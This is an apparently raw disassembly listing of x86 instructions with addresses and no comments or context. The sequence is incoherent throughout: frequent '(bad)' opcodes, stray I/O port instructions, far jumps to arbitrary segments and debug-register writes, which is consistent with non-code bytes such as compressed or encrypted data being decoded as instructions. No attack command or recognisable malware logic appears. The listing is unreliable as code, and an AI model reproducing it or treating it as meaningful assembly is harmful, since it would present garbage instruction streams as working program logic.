  6b3232:	inc    esi
  6b3233:	sub    al,0xeb
  6b3235:	sbb    bh,BYTE PTR [ebx]
  6b3237:	sub    al,dh
  6b3239:	pop    esp
  6b323a:	xor    ch,BYTE PTR [esi-0x63]
  6b323d:	loopne 0x6b3205
  6b323f:	in     eax,dx
  6b3240:	mov    fs,WORD PTR [edx]
  6b3242:	dec    ebx
  6b3243:	dec    ecx
  6b3244:	or     BYTE PTR [esi+0x28],cl
  6b3247:	push   ecx
  6b3248:	adc    DWORD PTR [ebp+0x6d],ebp
  6b324b:	fiadd  DWORD PTR [edi+0x7858260]
  6b3251:	in     eax,dx
  6b3252:	and    DWORD PTR [ecx+0x68],edx
  6b3255:	or     DWORD PTR [edi+0x0],ecx
  6b3258:	mov    ch,BYTE PTR [esi-0x77c72a5c]
  6b325e:	mov    WORD PTR [edi+0x74cf5e8c],?
  6b3264:	pop    ebp
  6b3265:	(bad)  
  6b3266:	out    dx,al
  6b3267:	mov    esp,0xe9f11d5f
  6b326c:	jge    0x6b3259
  6b326e:	rcr    cl,cl
  6b3270:	or     al,0x22
  6b3272:	jmp    0x8978:0x83c5abaf
  6b3279:	pop    ss
  6b327a:	ror    al,1
  6b327c:	sahf   
  6b327d:	jno    0x6b3203
  6b327f:	dec    edx
  6b3280:	cmp    al,0x22
  6b3282:	ret    
  6b3283:	test   ah,dl
  6b3285:	jbe    0x6b32e1
  6b3287:	int    0x7a
  6b3289:	inc    esp
  6b328a:	daa    
  6b328b:	or     DWORD PTR [eax],ebx
  6b328d:	inc    edx
  6b328e:	rcr    DWORD PTR [ecx],cl
  6b3290:	jecxz  0x6b3309
  6b3292:	jle    0x6b3243
  6b3294:	icebp  
  6b3295:	das    
  6b3296:	in     eax,dx
  6b3297:	or     cl,ah
  6b3299:	mov    ecx,0x86792fe3
  6b329e:	mov    eax,ds:0x8cb596cf
  6b32a3:	dec    ebx
  6b32a4:	shl    DWORD PTR [ecx],1
  6b32a6:	jo     0x6b32d2
  6b32a8:	test   DWORD PTR [edx+0x50],ebx
  6b32ab:	or     BYTE PTR [ebp-0x17],ch
  6b32ae:	popf   
  6b32af:	jmp    0xb1b2:0xca371d9c
  6b32b6:	add    eax,0x8b6f7b2f
  6b32bb:	pop    esi
  6b32bc:	xor    ebx,edi
  6b32be:	cmp    BYTE PTR [edx+0x40],al
  6b32c1:	cld    
  6b32c2:	mov    ds:0x6469e50a,al
  6b32c7:	ins    DWORD PTR es:[edi],dx
  6b32c8:	jb     0x6b32d4
  6b32ca:	mov    edx,0xa0cee698
  6b32cf:	repnz add al,0x38
  6b32d2:	inc    esi
  6b32d3:	(bad)  
  6b32d4:	lods   al,BYTE PTR ds:[esi]
  6b32d5:	das    
  6b32d6:	or     eax,0x1dfdb4fd
  6b32db:	test   al,0xe4
  6b32dd:	cmp    edx,ebx
  6b32df:	xor    DWORD PTR [ebp+0x5f734d35],eax
  6b32e5:	pushf  
  6b32e6:	xor    dl,BYTE PTR [eax+0x7bdd838b]
  6b32ec:	(bad)  
  6b32ed:	mov    ebp,0x36446f72
  6b32f2:	push   eax
  6b32f3:	icebp  
  6b32f4:	rcr    DWORD PTR [esi+0x13bf18ea],1
  6b32fa:	and    bh,BYTE PTR [eax-0x782ed3f]
  6b3300:	ss ret 0x78e3
  6b3304:	pop    ds
  6b3305:	ds loop 0x6b32f5
  6b3308:	call   0xeb85:0x6095ec0
  6b330f:	lds    ecx,FWORD PTR [edi+eiz*4+0x119f2c04]
  6b3316:	loop   0x6b32c0
  6b3318:	add    eax,edx
  6b331a:	in     al,0x94
  6b331c:	outs   dx,BYTE PTR ds:[esi]
  6b331d:	inc    esp
  6b331e:	sub    al,0x7b
  6b3320:	(bad)  
  6b3321:	retf   
  6b3322:	adc    eax,0x4ea49a7f
  6b3327:	push   es
  6b3328:	cmp    ebx,DWORD PTR [edx+0x7ef49888]
  6b332e:	mov    edx,0xd614562d
  6b3333:	sbb    BYTE PTR [ebp*8-0x69ab2713],dh
  6b333a:	fbstp  TBYTE PTR [esi]
  6b333c:	jecxz  0x6b3345
  6b333e:	scas   al,BYTE PTR es:[edi]
  6b333f:	iret   
  6b3340:	addr16 je 0x6b32ef
  6b3343:	sub    bh,BYTE PTR [esi-0x5b8c04f0]
  6b3349:	popa   
  6b334a:	push   edx
  6b334b:	push   cs
  6b334c:	mov    edx,0x897810a8
  6b3351:	add    DWORD PTR [ecx-0xf],eax
  6b3354:	jmp    0xf7b0:0xd80c00cc
  6b335b:	push   edi
  6b335c:	add    DWORD PTR [edi+0x2bc98e51],0x474b6cc4
  6b3366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b3367:	push   edx
  6b3368:	push   0xf
  6b336a:	cs jb  0x6b3314
  6b336d:	mov    ds:0x9a152512,eax
  6b3372:	jbe    0x6b3350
  6b3374:	popf   
  6b3375:	dec    esp
  6b3376:	sub    BYTE PTR [ebx],bh
  6b3378:	dec    edx
  6b3379:	mov    cl,0x68
  6b337b:	mov    cl,0x71
  6b337d:	mov    ebp,0x8d5f2e45
  6b3382:	stos   BYTE PTR es:[edi],al
  6b3383:	lock mov al,BYTE PTR [edi-0x135a2819]
  6b338a:	lods   al,BYTE PTR ds:[esi]
  6b338b:	mov    edi,0xc759e7b3
  6b3390:	(bad)  
  6b3391:	rcl    DWORD PTR [edx+0x49],1
  6b3394:	ds scas al,BYTE PTR es:[edi]
  6b3396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b3397:	imul   ebx,DWORD PTR [edi-0x5e],0xdbb572c9
  6b339e:	dec    eax
  6b339f:	(bad)  
  6b33a0:	cmp    al,0xe7
  6b33a2:	les    ecx,FWORD PTR [ebp+0xa369517]
  6b33a8:	or     DWORD PTR [esi-0x4a],edx
  6b33ab:	xchg   ebx,eax
  6b33ac:	and    DWORD PTR [edi+eax*8+0x306a77bb],edi
  6b33b3:	pushf  
  6b33b4:	in     al,0x60
  6b33b6:	push   eax
  6b33b7:	mov    ?,edi
  6b33b9:	popa   
  6b33ba:	lods   ax,WORD PTR ds:[esi]
  6b33bc:	mov    ds:0x33cdd00d,eax
  6b33c1:	xchg   ebp,eax
  6b33c2:	fsubr  st(6),st
  6b33c4:	int3   
  6b33c5:	test   DWORD PTR [edx],ebp
  6b33c7:	inc    ecx
  6b33c8:	xchg   esi,eax
  6b33c9:	stos   BYTE PTR es:[edi],al
  6b33ca:	nop
  6b33cb:	mov    edi,0x29911129
  6b33d0:	or     DWORD PTR [eax+ebx*1+0x0],ebx
  6b33d4:	jo     0x6b33ba
  6b33d6:	addr16 jnp 0x6b3365
  6b33d9:	daa    
  6b33da:	sbb    bh,dl
  6b33dc:	or     eax,0x7f84b1b0
  6b33e1:	enter  0x8d68,0x97
  6b33e5:	fistp  WORD PTR [ecx+0x3c]
  6b33e8:	aaa    
  6b33e9:	mov    al,ds:0x3eed2a0c
  6b33ee:	icebp  
  6b33ef:	mov    ds:0x4ca181fb,al
  6b33f4:	xchg   ecx,eax
  6b33f5:	mov    esi,0x54ddf71a
  6b33fa:	rol    DWORD PTR [eax-0x72],cl
  6b33fd:	dec    esp
  6b33fe:	inc    edx
  6b33ff:	or     eax,0x6dedb66e
  6b3404:	mov    ecx,0x69207fd1
  6b3409:	push   edx
  6b340a:	dec    esp
  6b340b:	lods   eax,DWORD PTR ds:[esi]
  6b340c:	push   ebp
  6b340d:	pop    ss
  6b340e:	cmp    ah,al
  6b3410:	add    BYTE PTR [edx+0x6ae809c1],al
  6b3416:	dec    esi
  6b3417:	scas   al,BYTE PTR es:[edi]
  6b3418:	fild   QWORD PTR [ebx-0x76]
  6b341b:	bnd jl 0x6b33be
  6b341e:	imul   eax,ebx,0x43366159
  6b3424:	mov    bl,0xeb
  6b3426:	in     al,dx
  6b3427:	clc    
  6b3428:	push   ecx
  6b3429:	ja     0xc2d4be13
  6b342f:	mov    ds:0xd3d29128,al
  6b3434:	ror    al,1
  6b3436:	push   0xe4f27d2
  6b343b:	dec    edx
  6b343c:	sub    eax,0x4acecc9a
  6b3441:	loopne 0x6b3457
  6b3443:	ret    
  6b3444:	add    BYTE PTR [edx],ah
  6b3446:	add    bl,bl
  6b3448:	sbb    al,0xa7
  6b344a:	iret   
  6b344b:	int    0x67
  6b344d:	fcom   st(6)
  6b344f:	repnz pop eax
  6b3451:	test   ebp,0x9722b9ce
  6b3457:	dec    ebx
  6b3458:	jmp    0x2c52:0x8cce9715
  6b345f:	or     DWORD PTR [esi+0x4f],ebx
  6b3462:	and    ah,dl
  6b3464:	popf   
  6b3465:	(bad)  [eax-0x189419c2]
  6b346b:	sub    al,0x27
  6b346d:	jl     0x6b3435
  6b346f:	add    esp,DWORD PTR [edi+0x6640e1e2]
  6b3475:	push   ss
  6b3476:	ja     0x6b34c6
  6b3478:	int    0x23
  6b347a:	lea    esi,ds:0xe5c86072
  6b3480:	int    0xbe
  6b3482:	mov    ds,WORD PTR [eax-0x3450e88e]
  6b3488:	ror    BYTE PTR [ebx+edi*1],cl
  6b348b:	sbb    DWORD PTR [ebp+0x96510e0],ebx
  6b3491:	pusha  
  6b3492:	mov    esi,0xad5c3210
  6b3497:	xor    eax,0x1569a809
  6b349c:	inc    edi
  6b349d:	imul   edi,DWORD PTR [ebx],0xffffffad
  6b34a0:	out    0x97,al
  6b34a2:	add    edx,DWORD PTR [edi-0x6a]
  6b34a5:	test   BYTE PTR [eax],dh
  6b34a7:	ins    DWORD PTR es:[edi],dx
  6b34a8:	cmp    edx,DWORD PTR [esi+0x77]
  6b34ab:	cmp    DWORD PTR [esi-0x7c],esp
  6b34ae:	arpl   sp,ax
  6b34b0:	dec    edi
  6b34b1:	addr16 push 0x1d
  6b34b4:	cwde   
  6b34b5:	aad    0x23
  6b34b7:	mov    bh,0x71
  6b34b9:	adc    ecx,ebx
  6b34bb:	bound  eax,QWORD PTR [esi+ecx*1+0x57]
  6b34bf:	mov    al,ds:0xf0a6780e
  6b34c4:	jnp    0x6b34df
  6b34c6:	push   DWORD PTR [ebp+edx*2-0x3e]
  6b34ca:	das    
  6b34cb:	cmp    dh,bl
  6b34cd:	push   edi
  6b34ce:	xchg   ecx,eax
  6b34cf:	cmp    eax,0x19ea26e3
  6b34d4:	inc    esp
  6b34d5:	jp     0x6b3518
  6b34d7:	sub    BYTE PTR [esi],0xa
  6b34da:	jns    0x6b353e
  6b34dc:	push   edx
  6b34dd:	lods   eax,DWORD PTR ds:[esi]
  6b34de:	int    0x9c
  6b34e0:	cmp    BYTE PTR [edi+0x43],ah
  6b34e3:	mov    db7,edi
  6b34e6:	mov    eax,edi
  6b34e8:	ret    
  6b34e9:	xor    DWORD PTR [edi],ebx
  6b34eb:	xor    ecx,DWORD PTR [ebx-0x1e]
  6b34ee:	outs   dx,BYTE PTR ds:[esi]
  6b34ef:	inc    edi
  6b34f0:	sbb    ebx,DWORD PTR [ebp+0x5b]
  6b34f3:	fld    QWORD PTR [ebp+0x5f3ca92e]
  6b34f9:	out    dx,al
  6b34fa:	aaa    
  6b34fb:	mov    bl,0xf1
  6b34fd:	mov    dl,0xf7
  6b34ff:	mov    eax,0x7d0887dd
  6b3504:	outs   dx,DWORD PTR ds:[esi]
  6b3505:	push   es
  6b3506:	sbb    esp,esp
  6b3508:	mov    eax,0xb4facac0
  6b350d:	push   ebp
  6b350e:	jl     0x6b3587
  6b3510:	jle    0x6b3543
  6b3512:	and    eax,0xf1a419cc
  6b3517:	fs sub dh,BYTE PTR ss:0x2e1aa27d
  6b351f:	mov    ch,0x3b
  6b3521:	sbb    bl,BYTE PTR [ebp+0x14f80c5d]
  6b3527:	les    ebp,FWORD PTR [ecx]
  6b3529:	ins    DWORD PTR es:[edi],dx
  6b352a:	push   ds
  6b352b:	xchg   BYTE PTR [edx+edx*8],ah
  6b352e:	push   edx
  6b352f:	(bad)  
  6b3530:	jnp    0x6b3568
  6b3532:	push   ebp
  6b3533:	or     eax,0xd56e733
  6b3538:	sub    BYTE PTR [edi],0x4f
  6b353b:	pop    edx
  6b353c:	and    al,0x7c
  6b353e:	repnz popf 
  6b3540:	psubq  mm0,QWORD PTR [eax]
  6b3543:	dec    esp
  6b3544:	nop
  6b3545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b3546:	dec    eax
  6b3547:	lahf   
  6b3548:	cmp    DWORD PTR [eax],esp
  6b354a:	ins    BYTE PTR es:[edi],dx
  6b354b:	and    BYTE PTR [edx-0x105971],dl
  6b3551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b3552:	test   DWORD PTR [esi+0x42b1b920],edi
  6b3558:	ret    0xabfe
  6b355b:	fidiv  WORD PTR [esi+0x5b30df5b]
  6b3561:	pop    es
  6b3562:	mov    edx,0xa3e4dcc1
  6b3567:	mov    cl,BYTE PTR [esi-0x7723bdab]
  6b356d:	adc    esp,DWORD PTR [edx+eiz*1+0x5c]
  6b3571:	iret   
  6b3572:	cli    
  6b3573:	dec    edi
  6b3574:	mov    DWORD PTR [ebx+0x1c873c4],0xa3663fa0
  6b357e:	add    ebp,DWORD PTR [eax]
  6b3580:	mov    es,ebp
  6b3582:	int    0xb3
  6b3584:	imul   ecx,DWORD PTR [ebx],0x16
  6b3587:	call   0x59e8:0x5f5af1cf
  6b358e:	jbe    0x6b35ee
  6b3590:	mov    edi,0xc57e17
  6b3595:	xor    esi,ebp
  6b3597:	out    0x7f,al
  6b3599:	mov    ecx,0xec5af89a
  6b359e:	sbb    DWORD PTR [eax-0x2b],esi
  6b35a1:	sbb    eax,0x9c9a00bd
  6b35a6:	pop    ebx
  6b35a7:	mov    ebp,0xd180b7aa
  6b35ac:	enter  0x5b8c,0x9c
  6b35b0:	push   es
  6b35b1:	in     al,dx
  6b35b2:	(bad)  
  6b35b3:	inc    edx
  6b35b4:	cmp    al,0x17
  6b35b6:	xor    eax,0xb05a3314
  6b35bb:	mov    cl,0x83
  6b35bd:	shl    edx,1
  6b35bf:	pop    edi
  6b35c0:	xor    eax,0x1d5d2f1a
  6b35c5:	fistp  WORD PTR [eax+0x1adcb5e0]
  6b35cb:	cmc    
  6b35cc:	jmp    0xcf718911
  6b35d1:	cmp    dh,BYTE PTR [ecx]
  6b35d3:	(bad)  
  6b35d4:	cmp    eax,0x23cf7057
  6b35d9:	mov    edi,0x26ce99d5
  6b35de:	jns    0x6b3625
  6b35e0:	inc    ebx
  6b35e1:	pushf  
  6b35e2:	scas   eax,DWORD PTR es:[edi]
  6b35e3:	stc    
  6b35e4:	call   0xb000:0x148df9ce
  6b35eb:	div    BYTE PTR [ebp-0x454c8a3a]
  6b35f1:	in     al,dx
  6b35f2:	cs xchg esi,eax
  6b35f4:	lds    edx,FWORD PTR [esi+0x3a6bd24f]
  6b35fa:	mov    ss,WORD PTR [edi-0x317de240]
  6b3600:	jno    0x6b3675
  6b3602:	popa   
  6b3603:	or     BYTE PTR [ebx+0x63],dl
  6b3606:	pop    ebp
  6b3607:	out    0x83,al
  6b3609:	or     al,BYTE PTR [ebx]
  6b360b:	cmp    DWORD PTR [eax+0x74],0xb263bd4d
  6b3612:	add    ecx,0xffffffa9
  6b3615:	outs   dx,DWORD PTR ds:[esi]
  6b3616:	ror    BYTE PTR [esi-0x21],1
  6b3619:	ds retf 0x711c
  6b361d:	xchg   edx,eax
  6b361e:	les    edi,FWORD PTR [esi-0x3572f8ee]
  6b3624:	or     al,0x5a
  6b3626:	push   0x7c1b80cc
  6b362b:	mov    dh,0xfc
  6b362d:	push   ebx
  6b362e:	xor    al,0xf0
  6b3630:	add    eax,0x74b1ca28
  6b3635:	stos   DWORD PTR es:[edi],eax
  6b3636:	mov    DWORD PTR [ecx-0x2c8cc650],esp
  6b363c:	hlt    
  6b363d:	sbb    DWORD PTR [eax*4-0x584bf99c],0xe906f62d
  6b3648:	push   cs
  6b3649:	mov    bh,0xc4
  6b364b:	es loop 0x6b3689
  6b364e:	adc    BYTE PTR [esi],0x5a
  6b3651:	fcomp  DWORD PTR [edx-0x56f53097]
  6b3657:	sbb    ch,BYTE PTR [ebx+0x3c226e48]
  6b365d:	and    esp,ebx
  6b365f:	lahf   
  6b3660:	clc    
  6b3661:	pop    ecx
  6b3662:	repz push ss
  6b3664:	mov    dh,0x9b
  6b3666:	add    ebx,DWORD PTR [ebp-0x1aef50b3]
  6b366c:	xlat   BYTE PTR ds:[ebx]
  6b366d:	inc    eax
  6b366e:	adc    esi,edx
  6b3670:	out    0xc,al
  6b3672:	cmp    dh,BYTE PTR [eax-0x3c]
  6b3675:	fisttp DWORD PTR [ecx]
  6b3677:	outs   dx,DWORD PTR ds:[esi]
  6b3678:	les    esp,FWORD PTR [ecx+edi*4]
  6b367b:	dec    edi
  6b367d:	std    
  6b367e:	fnsave [eax-0x8]
  6b3681:	mov    esi,ds
  6b3683:	ds pop bx
  6b3686:	rcr    DWORD PTR ds:0x31fd516f,0xf5
  6b368d:	add    dh,ch
  6b368f:	aaa    
  6b3690:	icebp  
  6b3691:	ins    DWORD PTR es:[edi],dx
  6b3692:	xor    esp,DWORD PTR [ecx]
  6b3694:	xchg   BYTE PTR [ebx+0x5153638a],al
  6b369a:	dec    ecx
  6b369b:	ins    BYTE PTR es:[edi],dx
  6b369c:	fisub  WORD PTR [ebp-0x76]
  6b369f:	and    bh,BYTE PTR [ebx+0x2aa9ce71]
  6b36a5:	mov    eax,0xbaae979b
  6b36aa:	xor    eax,0x20aead12
  6b36af:	retf   0xddf4
  6b36b2:	dec    edi
  6b36b3:	jo     0x6b36ae
  6b36b5:	imul   ecx,DWORD PTR [esi+0x76],0xffffff9d
  6b36b9:	test   eax,0x8675f22e
  6b36bf:	push   ecx
  6b36c0:	xor    eax,0xe7e7a6e
  6b36c5:	xor    eax,DWORD PTR [esp+esi*2]
  6b36c8:	dec    ecx
  6b36c9:	dec    ebp
  6b36ca:	mov    ah,BYTE PTR [ecx]
  6b36cc:	call   0xed18fdd0
  6b36d1:	adc    edx,ebp
  6b36d3:	fisttp WORD PTR [esi-0x6c]
  6b36d6:	pop    ebx
  6b36d7:	xchg   esi,eax
  6b36d8:	add    al,0x33
  6b36da:	outs   dx,DWORD PTR ds:[esi]
  6b36db:	in     eax,dx
  6b36dc:	fst    QWORD PTR [ebx-0x51]
  6b36df:	add    al,0x29
  6b36e1:	jb     0x6b3697
  6b36e3:	add    bl,0x83
  6b36e6:	addr16 jnp 0x6b36b7
  6b36e9:	jno    0x6b3708
  6b36eb:	(bad)  
  6b36ed:	repnz out 0x2b,eax
  6b36f0:	das    
  6b36f1:	aam    0xf6
  6b36f3:	repz jp 0x6b369c
  6b36f6:	adc    DWORD PTR [ecx+edx*2+0x7d],esp
  6b36fa:	jno    0x6b377b
  6b36fc:	into   
  6b36fd:	pop    ebp
  6b36fe:	sub    BYTE PTR fs:[edx],bl
  6b3701:	mov    dl,dl
  6b3703:	ja     0x6b3686
  6b3705:	xor    BYTE PTR [ebp+esi*4+0x56c9a588],0xa6
  6b370d:	call   0xb2a0:0x32cdedb1
  6b3714:	scas   al,BYTE PTR es:[edi]
  6b3715:	jg     0x6b36e5
  6b3717:	stos   BYTE PTR es:[edi],al
  6b3718:	jb     0x6b36ce
  6b371a:	jle    0x6b3798
  6b371c:	dec    ebx
  6b371d:	jle    0x6b3715
  6b371f:	inc    ebx
  6b3720:	or     bl,0x65
  6b3723:	aaa    
  6b3724:	xchg   esi,eax
  6b3725:	adc    eax,0xc0bd7f6c
  6b372a:	pop    ebx
  6b372b:	(bad)  [ecx]
  6b372d:	mov    esp,DWORD PTR [ebp+0x73e53fb7]
  6b3733:	jno    0x6b3706
  6b3735:	int3   
  6b3736:	cwde   
  6b3737:	mov    DWORD PTR [ebp-0x7b65f268],ebp
  6b373d:	cmp    edx,DWORD PTR [edx]
  6b373f:	or     al,BYTE PTR [edi+0x64]
  6b3742:	fadd   QWORD PTR [edi-0x1b]
  6b3745:	aas    
  6b3746:	jno    0x6b3742
  6b3748:	test   eax,0xa022d8cd
  6b374d:	aad    0x3
  6b374f:	or     BYTE PTR [ebp-0x4cd3dfde],cl
  6b3755:	lea    edx,[ebp+0x387da935]
  6b375b:	push   ss
  6b375c:	je     0x6b36f3
  6b375e:	pause  
  6b3760:	xor    DWORD PTR [edi],ecx
  6b3762:	ins    DWORD PTR es:[edi],dx
  6b3763:	test   BYTE PTR [ebx],ch
  6b3765:	pusha  
  6b3766:	push   cs
  6b3767:	mov    dh,0x38
  6b3769:	and    DWORD PTR [edx+0x402369c7],ecx
  6b376f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b3770:	fdivr  DWORD PTR [edx+0x25aa190c]
  6b3776:	xchg   edi,eax
  6b3777:	retf   0x7ec4
  6b377a:	rcr    BYTE PTR [ecx+0x48468ebc],0x2f
  6b3781:	pusha  
  6b3782:	dec    dl
  6b3784:	test   DWORD PTR ds:0x45e37255,ebx
  6b378a:	pop    ss
  6b378b:	pop    ds
  6b378c:	inc    ebp
  6b378d:	jp     0x6b380e
  6b378f:	push   edi
  6b3790:	push   edx
  6b3791:	(bad)  [ebx+eax*1+0x27]
  6b3795:	push   edx
  6b3796:	dec    eax
  6b3797:	xor    DWORD PTR [eax+0x7e],esp
  6b379a:	pushf  
  6b379b:	xor    BYTE PTR [esi+0x51f44bd9],bl
  6b37a1:	add    ah,0x92
  6b37a4:	or     BYTE PTR [ebp+0x24],ch
  6b37a7:	dec    esi
  6b37a8:	jmp    0x6b37ac
  6b37aa:	mov    ds:0x61b033ea,al
  6b37af:	jge    0x6b37b0
  6b37b1:	adc    BYTE PTR [ebx],bh
  6b37b3:	fild   DWORD PTR [ebx+0x79]
  6b37b6:	cs push esp
  6b37b8:	fs js  0x6b3785
  6b37bb:	sub    DWORD PTR [esi],ebx
  6b37bd:	scas   eax,DWORD PTR es:[edi]
  6b37be:	xchg   ebx,eax
  6b37bf:	daa    
  6b37c0:	data16 jmp 0x6b37e1
  6b37c3:	sbb    BYTE PTR [ecx],0x7c
  6b37c6:	and    eax,DWORD PTR [esi]
  6b37c8:	sub    dh,BYTE PTR [esi+0x11]
  6b37cb:	pop    edx
  6b37cc:	out    dx,eax
  6b37cd:	stos   BYTE PTR es:[edi],al
  6b37ce:	stc    
  6b37cf:	mov    dh,0x62
  6b37d1:	jge    0x6b3761
  6b37d3:	push   ds
  6b37d4:	rol    ebx,cl
  6b37d6:	xor    al,0x4e
  6b37d8:	and    BYTE PTR [edi],cl
  6b37da:	inc    ebx
  6b37db:	mov    edx,0x43cb4897
  6b37e0:	jnp    0x6b385e
  6b37e2:	push   es
  6b37e3:	sub    eax,DWORD PTR [edi+0x3ac18a90]
  6b37e9:	pop    ebp
  6b37ea:	mov    ecx,0x18390ca6
  6b37ef:	xchg   ebp,eax
  6b37f0:	int3   
  6b37f1:	jae    0x6b3786
  6b37f3:	in     eax,0x82
  6b37f5:	mov    ch,0x33
  6b37f7:	pop    edx
  6b37f8:	push   eax
  6b37f9:	push   es
  6b37fa:	(bad)  
  6b37fb:	xor    bl,BYTE PTR fs:[ebp-0x71f00e4c]
  6b3802:	lods   al,BYTE PTR ds:[esi]
  6b3803:	push   ebx
  6b3804:	adc    BYTE PTR [eax],ah
  6b3806:	or     dh,BYTE PTR [edi]
  6b3808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b3809:	push   0xffffff92
  6b380b:	popf   
  6b380c:	fld    st(0)
  6b380e:	test   ecx,edx
  6b3810:	adc    al,BYTE PTR [ecx+0x170d7538]
  6b3816:	call   0xfe45:0xa07c1906
  6b381d:	cld    
  6b381e:	push   eax
  6b381f:	jne    0x6b3839
  6b3821:	and    al,0x57
  6b3823:	push   ebp
  6b3824:	test   BYTE PTR [ecx-0x16c8604c],bh
  6b382a:	push   edi
  6b382b:	rcr    edi,1
  6b382d:	(bad)  
  6b382e:	in     al,0xe6
  6b3830:	fbstp  TBYTE PTR ds:0xd79f4861
  6b3836:	xor    ebx,DWORD PTR [edx]
  6b3838:	sbb    edi,DWORD PTR [eax+0x4e451615]
  6b383e:	push   esp
  6b383f:	or     esi,DWORD PTR [ecx-0x47f3f295]
  6b3845:	pop    edi
  6b3846:	or     al,0xdc
  6b3848:	mov    ah,0xbe
  6b384a:	mov    ah,0x72
  6b384c:	mov    ebp,ebp
  6b384e:	sbb    BYTE PTR [edi-0x43f1dcd7],al
  6b3854:	jmp    0x9529:0xe86b4a80
  6b385b:	mov    ah,0xa0
  6b385d:	add    bh,BYTE PTR [eax+ebp*1-0x648f42eb]
  6b3864:	(bad)  
  6b3866:	jae    0x6b389b
  6b3868:	mov    ecx,0x6da2cf91
  6b386d:	cmp    al,0x53
  6b386f:	add    al,0xf
  6b3871:	jno    0x6b383f
  6b3873:	shr    edx,1
  6b3875:	mov    ah,0x83
  6b3877:	sahf   
  6b3878:	cwde   
  6b3879:	test   DWORD PTR [ecx+0x3eec5714],0x5841f318
  6b3883:	or     edi,DWORD PTR [ebx+0x38250d5]
  6b3889:	push   edi
  6b388a:	inc    esp
  6b388b:	imul   ebp,DWORD PTR [edx+0x51],0xfffffff0
  6b388f:	mov    ebx,0xa1e2d53b
  6b3894:	mov    eax,0xc864e14c
  6b3899:	add    BYTE PTR [esi],ah
  6b389b:	cmc    
  6b389c:	xchg   edx,eax
  6b389d:	or     al,0x3c
  6b389f:	sahf   
  6b38a0:	cmp    BYTE PTR [ebx],ch
  6b38a2:	mov    bh,0xa4
  6b38a4:	cmp    al,0x3e
  6b38a6:	push   es
  6b38a7:	inc    ebx
  6b38a8:	xor    BYTE PTR [edi-0x6bb619d9],0xba
  6b38af:	inc    eax
  6b38b0:	pop    ebp
  6b38b1:	sub    ah,BYTE PTR [edi]
  6b38b3:	fstp   DWORD PTR [eax+0x5d]
  6b38b6:	jno    0x6b392b
  6b38b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b38b9:	out    0xe1,eax
  6b38bb:	mov    eax,ds:0xd4386b2c
  6b38c0:	pop    edx
  6b38c1:	shl    BYTE PTR [edi-0x60],cl
  6b38c4:	outs   dx,DWORD PTR ds:[esi]
  6b38c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b38c6:	cmp    ecx,DWORD PTR [eax+0x118a959c]
  6b38cc:	jecxz  0x6b38db
  6b38ce:	pop    esp
  6b38cf:	add    esi,ecx
  6b38d1:	mov    ch,0x6
  6b38d3:	stc    
  6b38d4:	and    edx,esi
  6b38d6:	push   esp
  6b38d7:	ja     0x6b38b1
  6b38d9:	or     eax,DWORD PTR [ecx+0x4e]
  6b38dc:	fnstenv [eax-0x24]
  6b38df:	inc    ebp
  6b38e0:	xor    ebp,DWORD PTR [edi]
  6b38e2:	test   DWORD PTR [edx+0x5b],0xc1d02be0
  6b38e9:	sbb    BYTE PTR [eax+edi*2+0x750caf76],0x68
  6b38f1:	mov    ebp,0x492b40f2
  6b38f6:	dec    esp
  6b38f7:	xchg   edi,eax
  6b38f8:	pop    edx
  6b38f9:	push   ss
  6b38fa:	popf   
  6b38fb:	push   ebp
  6b38fc:	xchg   BYTE PTR [eax+0x49],bl
  6b38ff:	xor    DWORD PTR [ecx+0x2af6e320],0xc70af0dd
  6b3909:	mov    esp,0x54fb8bff
  6b390e:	in     al,0x44
  6b3910:	mov    ecx,0xd984b0bf
  6b3915:	mov    esi,0xb46cdb1d
  6b391a:	fst    st(0)
  6b391c:	outs   dx,BYTE PTR ds:[esi]
  6b391d:	sti    
  6b391e:	imul   ebp,DWORD PTR [edi+0x6e],0x224c4039
  6b3925:	fist   WORD PTR [edx+0x44]
  6b3928:	mov    al,BYTE PTR [edx-0x7a5688ca]
  6b392e:	bound  esp,QWORD PTR [ebx+0x201d5ff9]
  6b3934:	pop    ebp
  6b3935:	daa    
  6b3936:	out    dx,eax
  6b3937:	frstor [esi]
  6b3939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b393a:	es popa 
  6b393c:	add    esp,edx
  6b393e:	adc    al,0x37
  6b3940:	pusha  
  6b3941:	push   0xfffffff1
  6b3943:	xor    al,0x85
  6b3945:	cdq    
  6b3946:	mov    ds:0x278dc7b2,al
  6b394b:	lods   eax,DWORD PTR ds:[esi]
  6b394c:	and    DWORD PTR [esi],ecx
  6b394e:	scas   al,BYTE PTR es:[edi]
  6b394f:	pop    edi
  6b3950:	inc    esp
  6b3951:	cmp    BYTE PTR [edi+0xa],ch
  6b3954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b3955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b3956:	and    DWORD PTR [eax],esi
  6b3958:	jmp    0xc30f:0x4eabc403
  6b395f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b3960:	inc    ecx
  6b3961:	pop    esp
  6b3962:	or     eax,0xd09afbb2
  6b3967:	pop    ecx
  6b3968:	fidiv  WORD PTR [ecx+ebx*4]
  6b396b:	add    DWORD PTR [edx],eax
  6b396d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b396e:	imul   esp,DWORD PTR [esi],0x4f7ee34c
  6b3974:	aaa    
  6b3975:	cwde   
  6b3976:	inc    edi
  6b3977:	test   al,0xcc
  6b3979:	or     BYTE PTR [ecx+0xa],0xe9
  6b397d:	(bad)
  6b3980:	sti    
  6b3981:	mov    ebp,0x2a5d14a3
  6b3986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b3987:	es push ss
  6b3989:	push   esp
  6b398a:	and    esp,DWORD PTR [ebx+edi*1]
  6b398d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b398e:	adc    DWORD PTR [ebp-0x770e13d3],edi
  6b3994:	ja     0x6b39a0
  6b3996:	push   ebx
